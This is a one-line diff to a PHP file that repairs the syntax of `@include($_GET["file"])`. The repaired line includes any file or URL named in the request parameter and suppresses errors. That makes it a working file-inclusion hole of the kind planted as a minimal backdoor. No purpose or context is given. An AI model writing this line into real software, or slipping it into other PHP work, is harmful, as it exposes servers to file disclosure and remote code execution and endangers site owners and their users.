@@ -1,1 +1,1 @@
-<?php @include($_GET["file"]?>
+<?php @include($_GET["file"]); ?>
